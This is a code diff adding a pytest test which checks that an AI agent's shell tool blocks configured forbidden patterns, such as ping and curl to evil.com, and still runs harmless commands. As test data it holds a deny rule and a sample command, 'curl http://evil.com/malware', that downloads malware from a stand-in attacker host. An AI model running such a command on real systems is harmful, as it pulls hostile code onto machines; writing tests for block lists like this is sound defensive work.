@@ -464,3 +464,40 @@ async def test_grep_slash_command(tmp_path) -> None:
     assert reply_msg is not None
     assert "Search Results for 'keyword'" in reply_msg
     assert "Testing grep keyword match." in reply_msg
+
+
+@pytest.mark.asyncio
+async def test_run_shell_command_forbidden_patterns(tmp_path) -> None:
+    """Test that run_shell_command blocks forbidden patterns with custom error messages."""
+    import kesoku.config
+    from kesoku.config import init_config, load_config
+
+    original_config = kesoku.config._global_config
+    try:
+        config_path = tmp_path / "config.toml"
+        init_config(str(config_path))
+        cfg = load_config(str(config_path))
+        cfg.agent_working_dir = str(tmp_path)
+
+        # Configure forbidden patterns
+        cfg.shell.forbidden_patterns = {
+            r"ping": "Ping is not allowed for security reasons.",
+            r"curl.*evil\.com": "Access to evil.com is blocked.",
+        }
+
+        ctx = ToolContext(session_id="test_sess", session_workspace="test_ws")
+
+        # Test matching pattern 1
+        res1 = await run_shell_command("ping 8.8.8.8", context=ctx)
+        assert res1 == "Ping is not allowed for security reasons."
+
+        # Test matching pattern 2
+        res2 = await run_shell_command("curl http://evil.com/malware", context=ctx)
+        assert res2 == "Access to evil.com is blocked."
+
+        # Test non-matching pattern
+        res3 = await run_shell_command("echo hello", context=ctx)
+        assert "hello" in res3
+
+    finally:
+        kesoku.config._global_config = original_config
